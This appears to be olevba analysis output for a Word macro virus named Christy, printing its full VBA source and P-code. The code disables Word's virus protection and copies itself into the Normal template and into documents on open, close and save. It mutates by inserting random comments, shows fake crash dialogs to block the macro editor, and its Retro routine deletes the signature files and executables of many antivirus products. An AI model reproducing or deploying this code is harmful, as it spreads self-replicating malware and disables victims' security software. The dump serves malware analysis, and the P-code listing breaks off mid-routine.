olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Christy
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Christy - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Christy.bas 
in file: Virus.MSWord.Christy - OLE stream: 'Macros/VBA/Christy'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    ' EQZIGWDOPPS
Sub AutoClose()
On Error Resume Next
    ' XGYWLMUVJFIKDQCFSNEZMALHTXV
    
    ' ADJEZ
    ' ONQCSGBHYIQJJIFFLQGRPPCBDGKPHVXNK
    Mutate
    
    ' PTSRTGONOHKJZNPMAJDRDFJCQ
    ' SXFJOJFPQDBQVQLEMZUJMORAQXIDLUJKT
    ' TPPGNUWCOKBLSMKYZPNPCEHADKOOUBKBIPNPIXUO
    Application.ScreenUpdating = False
    ' NEHCZHQHWIUEHBMLPAIDITQZVOPEX
   
    ' EBGTYIRUAUMFPXYQARZAYBHPVBBOIK
    WordBasic.DisableAutoMacros = 0
    ' LIBKOTPQUKUSSTEUBGYVFEGYGGSRUT
    ' KISFBXBLTTVFMWVKMJ
    Options.VirusProtection = False
    ' KVGR
    ' TLCKISIUDPYGYCZQPXOGWBLTGJKNHPFCX
    
    DocInstalled = False
    GlobalInstalled = False

    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "Christy" Then
            DocInstalled = True
        End If
    ' SDGAVUUILOUOFFJOINLOBOFZ
    Next
    ' VKUZGESAISCCHKOIHVIJKVKSRKYQNFPTLXHRXHJA

    If DocInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Christy", Object:=wdOrganizerObjectProjectItems
        ActiveDocument.SaveAs FileName:=ActiveDocument.Name, FileFormat:=wdFormatTemplate
    End If

    For j = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(j).Name = "Christy" Then
            GlobalInstalled = True
        End If
    Next

    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Christy", Object:=wdOrganizerObjectProjectItems
        NormalTemplate.Save
    End If

End Sub

Sub FileTemplates()

  MsgBox "This program has performed an illegal operation and will be shut down.", vbCritical, "Microsoft Word"

End Sub

Sub AutoOpen()
On Error Resume Next

    Mutate

    Application.ScreenUpdating = False

    WordBasic.DisableAutoMacros = 0
    Options.VirusProtection = False

    DocInstalled = False
    GlobalInstalled = False

    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "Christy" Then
            DocInstalled = True
        End If
    Next

    If DocInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Christy", Object:=wdOrganizerObjectProjectItems
        ActiveDocument.SaveAs FileName:=ActiveDocument.Name, FileFormat:=wdFormatTemplate
    End If
    
    For j = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(j).Name = "Christy" Then
            GlobalInstalled = True
        End If
    Next
    
    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Christy", Object:=wdOrganizerObjectProjectItems
        NormalTemplate.Save
    End If

End Sub

Sub ToolsMacro()
    
  MsgBox "This program has performed an illegal operation and will be shut down.", vbCritical, "Microsoft Word"

End Sub

Sub FileSaveAs()
    
    Mutate
    
    Dialogs(wdDialogFileSaveAs).Show

On Error Resume Next
    
    Application.ScreenUpdating = False
    
    WordBasic.DisableAutoMacros = 0
    Options.VirusProtection = False

    DocInstalled = False
    GlobalInstalled = False

    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "Christy" Then
            DocInstalled = True
        End If
    Next

    If DocInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Christy", Object:=wdOrganizerObjectProjectItems
        ActiveDocument.SaveAs FileName:=ActiveDocument.Name, FileFormat:=wdFormatTemplate
    End If

    For j = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(j).Name = "Christy" Then
            GlobalInstalled = True
        End If
    Next

    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Christy", Object:=wdOrganizerObjectProjectItems
        NormalTemplate.Save
    End If

    Application.DisplayAlerts = wdAlertsAll

End Sub

Sub Mutate()
On Error Resume Next

    ChristyPayload

    Set Current = MacroContainer

    MorePoly = Int(Rnd() * 20 + 1)

    For Grow = 1 To MorePoly
        Number = Current.VBProject.VBComponents("Christy").CodeModule.ProcCountLines("Mutate", vbext_pk_Proc)
        RandomLine = Int(Rnd() * Number + 1)
        RemarkLength = Int(Rnd() * 40 + 1)

            For Length = 1 To RemarkLength
                Remark = Remark + Chr$(Int((90 - 65 + 1) * Rnd + 65))
            Next Length

        Current.VBProject.VBComponents("Christy").CodeModule.InsertLines RandomLine, vbTab & "' " & Remark
        Remark = ""
    Next Grow

End Sub

Sub ChristyPayload()
On Error GoTo Christy
  If Month(Now()) = 12 And Day(Now()) = 21 Then
    Set myRange = ActiveDocument.Range(Start:=0, End:=0)
    With myRange
      .InsertBefore "I LOVE CHRISTY"
      .Font.Name = "Arial"
      .Font.Size = 36
    End With
  End If

  If Month(Now()) = 10 And Day(Now()) = 16 Then
    MsgBox "Christy, written by DarkChasm", vbOKOnly, "I LOVE CHRISTY"
  End If
Christy:
Retro
End Sub

Sub Retro()
On Error Resume Next
Kill "C:\PC-Cillin 95\Scan32.dll"
Kill "c:\pc-cil~1\*.dll"
Kill "C:\PC-Cillin 95\Lpt$vpn.*"
Kill "C:\PC-Cillin 97\Scan32.dll"
Kill "C:\PC-Cillin 97\Lpt$vpn.*"
Kill "C:\Tsc\PC-Cillin 97\Scan32.dll"
Kill "c:\tsc\pc-cil~1\*.dll"
Kill "C:\Tsc\PC-Cillin 97\Lpt$vpn.*"
Kill "C:\Zlockav\Gsav.dat"
Kill "C:\Zlockav\Gsav.cas"
Kill "C:\Program Files\Norton AntiVirus\Viruscan.dat"
Kill "C:\progra~1\norton~1\viruscan.dat"
Kill "C:\Program Files\Symantec\Symevnt.386"
Kill "C:\progra~1\symantec\symevnt.386"
Kill "C:\Program Files\McAfee\VirusScan95\Scan.dat"
Kill "C:\progra~1\mcafee\viruss~1\scan.dat"
Kill "C:\Program Files\McAfee\VirusScan95\Mcscan32.dll"
Kill "C:\progra~1\mcafee\viruss~1\mcscan32.dll"
Kill "C:\Program Files\McAfee\VirusScan\Scan.dat"
Kill "C:\Program Files\McAfee\VirusScan\Mcscan32.dll"
Kill "C:\Program Files\Command Software\F-PROT95\Sign.def"
Kill "C:\progra~1\comman~1\f-prot95\sign.def"
Kill "C:\Program Files\Command Software\F-PROT95\Dvp.vxd"
Kill "C:\progra~1\comman~1\f-prot95\dvp.vxd"
Kill "C:\Program Files\AntiViral Toolkit Pro\Avp32.exe"
Kill "C:\progra~1\Antivi~1\Avp32.exe"
Kill "C:\Program Files\AntiViral Toolkit Pro\*.avc"
Kill "C:\progra~1\antivi~1\*.avc"
Kill "C:\TBAVW95\Tbscan.sig"
Kill "c:\Tbavw95\Tb*.*"
Kill "C:\Tbavw95\Tbavw95.vxd"
Kill "C:\f-macro\f-macro.exe"
Kill "C:\f-prot~1\f-prot.exe"
End Sub

Sub ToolsCustomize()

  MsgBox "This program has performed an illegal operation and will be shut down.", vbCritical, "Microsoft Word"

End Sub

Sub ToolsOptions()

  MsgBox "This program has performed an illegal operation and will be shut down.", vbCritical, "Microsoft Word"

End Sub

Sub ViewVBCode()

  MsgBox "This program has performed an illegal operation and will be shut down.", vbCritical, "Microsoft Word"

End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Christy
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1125 bytes
' Macros/VBA/Christy - 30644 bytes
' Line #0:
' 	QuoteRem 0x0004 0x000C " EQZIGWDOPPS"
' Line #1:
' 	FuncDefn (Sub AutoClose())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	QuoteRem 0x0004 0x001C " XGYWLMUVJFIKDQCFSNEZMALHTXV"
' Line #4:
' Line #5:
' 	QuoteRem 0x0004 0x0006 " ADJEZ"
' Line #6:
' 	QuoteRem 0x0004 0x0022 " ONQCSGBHYIQJJIFFLQGRPPCBDGKPHVXNK"
' Line #7:
' 	ArgsCall Mutate 0x0000 
' Line #8:
' Line #9:
' 	QuoteRem 0x0004 0x001A " PTSRTGONOHKJZNPMAJDRDFJCQ"
' Line #10:
' 	QuoteRem 0x0004 0x0022 " SXFJOJFPQDBQVQLEMZUJMORAQXIDLUJKT"
' Line #11:
' 	QuoteRem 0x0004 0x0029 " TPPGNUWCOKBLSMKYZPNPCEHADKOOUBKBIPNPIXUO"
' Line #12:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #13:
' 	QuoteRem 0x0004 0x001E " NEHCZHQHWIUEHBMLPAIDITQZVOPEX"
' Line #14:
' Line #15:
' 	QuoteRem 0x0004 0x001F " EBGTYIRUAUMFPXYQARZAYBHPVBBOIK"
' Line #16:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	MemSt DisableAutoMacros 
' Line #17:
' 	QuoteRem 0x0004 0x001F " LIBKOTPQUKUSSTEUBGYVFEGYGGSRUT"
' Line #18:
' 	QuoteRem 0x0004 0x0013 " KISFBXBLTTVFMWVKMJ"
' Line #19:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #20:
' 	QuoteRem 0x0004 0x0005 " KVGR"
' Line #21:
' 	QuoteRem 0x0004 0x0022 " TLCKISIUDPYGYCZQPXOGWBLTGJKNHPFCX"
' Line #22:
' Line #23:
' 	LitVarSpecial (False)
' 	St DocInstalled 
' Line #24:
' 	LitVarSpecial (False)
' 	St GlobalInstalled 
' Line #25:
' Line #26:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #27:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "Christy"
' 	Eq 
' 	IfBlock 
' Line #28:
' 	LitVarSpecial (True)
' 	St DocInstalled 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	QuoteRem 0x0004 0x0019 " SDGAVUUILOUOFFJOINLOBOFZ"
' Line #31:
' 	StartForVariable 
' 	Next 
' Line #32:
' 	QuoteRem 0x0004 0x0029 " VKUZGESAISCCHKOIHVIJKVKSRKYQNFPTLXHRXHJA"
' Line #33:
' Line #34:
' 	Ld DocInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #35:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "Christy"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #36:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #37:
' 	EndIfBlock 
' Line #38:
' Line #39:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #40:
' 	Ld j 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "Christy"
' 	Eq 
' 	IfBlock 
' Line #41:
' 	LitVarSpecial (True)
' 	St GlobalInstalled 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	StartForVariable 
' 	Next 
' Line #44:
' Line #45:
' 	Ld GlobalInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #46:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "Christy"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #47:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #48:
' 	EndIfBlock 
' Line #49:
' Line #50:
' 	EndSub 
' Line #51:
' Line #52:
' 	FuncDefn (Sub FileTemplates())
' Line #53:
' Line #54:
' 	LitStr 0x0046 "This program has performed an illegal operation and will be shut down."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #55:
' Line #56:
' 	EndSub 
' Line #57:
' Line #58:
' 	FuncDefn (Sub AutoOpen())
' Line #59:
' 	OnError (Resume Next) 
' Line #60:
' Line #61:
' 	ArgsCall Mutate 0x0000 
' Line #62:
' Line #63:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #64:
' Line #65:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	MemSt DisableAutoMacros 
' Line #66:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #67:
' Line #68:
' 	LitVarSpecial (False)
' 	St DocInstalled 
' Line #69:
' 	LitVarSpecial (False)
' 	St GlobalInstalled 
' Line #70:
' Line #71:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #72:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "Christy"
' 	Eq 
' 	IfBlock 
' Line #73:
' 	LitVarSpecial (True)
' 	St DocInstalled 
' Line #74:
' 	EndIfBlock 
' Line #75:
' 	StartForVariable 
' 	Next 
' Line #76:
' Line #77:
' 	Ld DocInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #78:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "Christy"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #79:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #80:
' 	EndIfBlock 
' Line #81:
' Line #82:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #83:
' 	Ld j 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "Christy"
' 	Eq 
' 	IfBlock 
' Line #84:
' 	LitVarSpecial (True)
' 	St GlobalInstalled 
' Line #85:
' 	EndIfBlock 
' Line #86:
' 	StartForVariable 
' 	Next 
' Line #87:
' Line #88:
' 	Ld GlobalInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #89:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "Christy"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #90:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #91:
' 	EndIfBlock 
' Line #92:
' Line #93:
' 	EndSub 
' Line #94:
' Line #95:
' 	FuncDefn (Sub ToolsMacro())
' Line #96:
' Line #97:
' 	LitStr 0x0046 "This program has performed an illegal operation and will be shut down."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #98:
' Line #99:
' 	EndSub 
' Line #100:
' Line #101:
' 	FuncDefn (Sub FileSaveAs())
' Line #102:
' Line #103:
' 	ArgsCall Mutate 0x0000 
' Line #104:
' Line #105:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #106:
' Line #107:
' 	OnError (Resume Next) 
' Line #108:
' Line #109:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #110:
' Line #111:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	MemSt DisableAutoMacros 
' Line #112:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #113:
' Line #114:
' 	LitVarSpecial (False)
' 	St DocInstalled 
' Line #115:
' 	LitVarSpecial (False)
' 	St GlobalInstalled 
' Line #116:
' Line #117:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #118:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "Christy"
' 	Eq 
' 	IfBlock 
' Line #119:
' 	LitVarSpecial (True)
' 	St DocInstalled 
' Line #120:
' 	EndIfBlock 
' Line #121:
' 	StartForVariable 
' 	Next 
' Line #122:
' Line #123:
' 	Ld DocInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #124:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "Christy"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #125:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #126:
' 	EndIfBlock 
' Line #127:
' Line #128:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #129:
' 	Ld j 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "Christy"
' 	Eq 
' 	IfBlock 
' Line #130:
' 	LitVarSpecial (True)
' 	St GlobalInstalled 
' Line #131:
' 	EndIfBlock 
' Line #132:
' 	StartForVariable 
' 	Next 
' Line #133:
' Line #134:
' 	Ld GlobalInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #135:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "Christy"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #136:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #137:
' 	EndIfBlock 
' Line #138:
' Line #139:
' 	Ld wdAlertsAll 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #140:
' Line #141:
' 	EndSub 
' Line #142:
' Line #143:
' 	FuncDefn (Sub Mutate())
' Line #144:
' 	OnError (Resume Next) 
' Line #145:
' Line #146:
' 	ArgsCall ChristyPayload 0x0000 
' Line #147:
' Line #148:
' 	SetStmt 
' 	Ld MacroContainer 
' 	Set Current 
' Line #149:
' Line #150:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x0014 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St MorePoly 
' Line #151:
' Line #152:
' 	StartForVariable 
' 	Ld Grow 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld MorePoly 
' 	For 
' Line #153:
' 	LitStr 0x0006 "Mutate"
' 	Ld vbext_pk_Proc 
' 	LitStr 0x0007 "Christy"
' 	Ld Current 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	St Number 
' Line #154:
' 	ArgsLd Rnd 0x0000 
' 	Ld Number 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St RandomLine 
' Line #155:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x0028 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St RemarkLength 
' Line #156:
' Line #157:
' 	StartForVariable 
' 	Ld Length 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld RemarkLength 
' 	For 
' Line #158:
' 	Ld Remark 
' 	LitDI2 0x005A 
' 	LitDI2 0x0041 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Remark 
' Line #159:
' 	StartForVariable 
' 	Ld Length 
' 	EndForVariable 
' 	NextVar 
' Line #160:
' Line #161:
' 	Ld RandomLine 
' 	Ld vbTab 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Remark 
' 	Concat 
' 	LitStr 0x0007 "Christy"
' 	Ld Current 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #162:
' 	LitStr 0x0000 ""
' 	St Remark 
' Line #163:
' 	StartForVariable 
' 	Ld Grow 
' 	EndForVariable 
' 	NextVar 
' Line #164:
' Line #165:
' 	EndSub 
' Line #166:
' Line #167:
' 	FuncDefn (Sub ChristyPayload())
' Line #168:
' 	OnError Christy 
' Line #169:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0015 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #170:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	ParamNamed Start 
' 	LitDI2 0x0000 
' 	ParamNamed End 
' 	Ld ActiveDocument 
' 	ArgsMemLd Range 0x0002 
' 	Set myRange 
' Line #171:
' 	StartWithExpr 
' 	Ld myRange 
' 	With 
' Line #172:
' 	LitStr 0x000E "I LOVE CHRISTY"
' 	ArgsMemCallWith InsertBefore 0x0001 
' Line #173:
' 	LitStr 0x0005 "Arial"
' 	MemLdWith Font 
' 	MemSt New 
' Line #174:
' 	LitDI2 0x0024 
' 	MemLdWith Font 
' 	MemSt Size 
' Line #175:
' 	EndWith 
' Line #176:
' 	EndIfBlock 
' Line #177:
' Line #178:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000A 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0010 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #179:
' 	LitStr 0x001D "Christy, written by DarkChasm"
' 	Ld vbOKOnly 
' 	LitStr 0x000E "I LOVE CHRISTY"
' 	ArgsCall MsgBox 0x0003 
' Line #180:
' 	EndIfBlock 
' Line #181:
' 	Label Christy 
' Line #182:
' 	ArgsCall Retro 0x0000 
' Line #183:
' 	EndSub 
' Line #184:
' Line #185:
' 	FuncDefn (Sub Retro())
' Line #186:
' 	OnError (Resume Next) 
' Line #187:
' 	LitStr 0x001A "C:\PC-Cillin 95\Scan32.dll"
' 	ArgsCall Kill 0x0001 
' Line #188:
' 	LitStr 0x0011 "c:\pc-cil~1\*.dll"
' 	ArgsCall Kill 0x0001 
' Line #189:
' 	LitStr 0x0019 "C:\PC-Cillin 95\Lpt$vpn.*"
' 	ArgsCall Kill 0x0001 
' Line #190:
' 	LitStr 0x001A "C:\PC-Cillin 97\Scan32.dll"
' 	ArgsCall Kill 0x0001 
' Line #191:
' 	LitStr 0x0019 "C:\PC-Cillin 97\Lpt$vpn.*"
' 	ArgsCall Kill 0x0001 
' Line #192:
' 	LitStr 0x001E "C:\Tsc\PC-Cillin 97\Scan32.dll"
' 	ArgsCall Kill 0x0001 
' Line #193:
' 	LitStr 0x0015 "c:\tsc\pc-cil~1\*.dll"
' 	ArgsCall Kill 0x0001 
' Line #194:
' 	LitStr 0x001D "C:\Tsc\PC-Cillin 97\Lpt$vpn.*"
' 	ArgsCall Kill 0x0001 
' Line #195:
' 	LitStr 0x0013 "C:\Zlockav\Gsav.dat"
' 	ArgsCall Kill 0x0001 
' Line #196:
' 	LitStr 0x0013 "C:\Zlockav\Gsav.cas"
' 	ArgsCall Kill 0x0001 
' Line #197:
' 	LitStr 0x002E "C:\Program Files\Norton AntiVirus\Viruscan.dat"
' 	ArgsCall Kill 0x0001 
' Line #198:
' 	LitStr 0x0021 "C:\progra~1\norton~1\viruscan.dat"
' 	ArgsCall Kill 0x0001 
' Line #199:
' 	LitStr 0x0025 "C:\Program Files\Symantec\Symevnt.386"
' 	ArgsCall Kill 0x0001 
' Line #200:
' 	LitStr 0x0020 "C:\progra~1\symantec\symevnt.386"
' 	ArgsCall Kill 0x0001 
' Line #201:
' 	LitStr 0x002C "C:\Program Files\McAfee\VirusScan95\Scan.dat"
' 	ArgsCall Kill 0x0001 
' Line #202:
' 	LitStr 0x0024 "C:\progra~1\mcafee\viruss~1\scan.dat"
' 	ArgsCall Kill 0x0001 
' Line #203:
' 	LitStr 0x0030 "C:\Program Files\McAfee\VirusScan95\Mcscan32.dll"
' 	ArgsCall Kill 0x0001 
' Line #204:
' 	LitStr 0x0028 "C:\progra~1\mcafee\viruss~1\mcscan32.dll"
' 	ArgsCall Kill 0x0001 
' Line #205:
' 	LitStr 0x002A "C:\Program Files\McAfee\VirusScan\Scan.dat"
' 	ArgsCall Kill 0x0001 
' Line #206:
' 	LitStr 0x002E "C:\Program Files\McAfee\VirusScan\Mcscan32.dll"
' 	ArgsCall Kill 0x0001 
' Line #207:
' 	LitStr 0x0033 "C:\Program Files\Command Software\F-PROT95\Sign.def"
' 	ArgsCall Kill 0x0001 
' Line #208:
' 	LitStr 0x0026 "C:\progra~1\comman~1\f-prot95\sign.def"
' 	ArgsCall Kill 0x0001 
' Line #209:
' 	LitStr 0x0032 "C:\Program Files\Command Software\F-PROT95\Dvp.vxd"
' 	ArgsCall Kill 0x0001 
' Line #210:
' 	LitStr 0x0025 "C:\progra~1\comman~1\f-prot95\dvp.vxd"
' 	ArgsCall Kill 0x0001 
' Line #211:
' 	LitStr 0x0030 "C:\Program Files\AntiViral Toolkit Pro\Avp32.exe"
' 	ArgsCall Kill 0x0001 
' Line #212:
' 	LitStr 0x001E "C:\progra~1\Antivi~1\Avp32.exe"
' 	ArgsCall Kill 0x0001 
' Line #213:
' 	LitStr 0x002C "C:\Program Files\AntiViral Toolkit Pro\*.avc"
' 	ArgsCall Kill 0x0001 
' Line #214:
' 	LitStr 0x001A "C:\progra~1\antivi~1\*.avc"
' 	ArgsCall Kill 0x0001 
' Line #215:
' 	LitStr 0x0015 "C:\TBAVW95\Tbscan.sig"
' 	ArgsCall Kill 0x0001 
' Line #216:
' 	LitStr 0x0010 "c:\Tbavw95\Tb*.*"
' 	ArgsCall Kill 0x0001 
' Line #217:
' 	LitStr 0x0016 "C:\Tbavw95\Tbavw95.vxd"
' 	ArgsCall Kill 0x0001 
' Line #218:
' 	LitStr 0x0016 "C:\f-macro\f-macro.exe"
' 	ArgsCall Kill 0x0001 
' Line #219:
' 	LitStr 0x0016 "C:\f-prot~1\f-prot.exe"
' 	ArgsCall Kill 0x0001 
' Line #220:
' 	EndSub 
' Line #221:
' Line #222:
' 	FuncDefn (Sub ToolsCustomize())
' Line #223:
' Line #224:
' 	LitStr 0x0046 "This program has performed an illegal operation and will be shut down."
' 	Ld vbCritical 
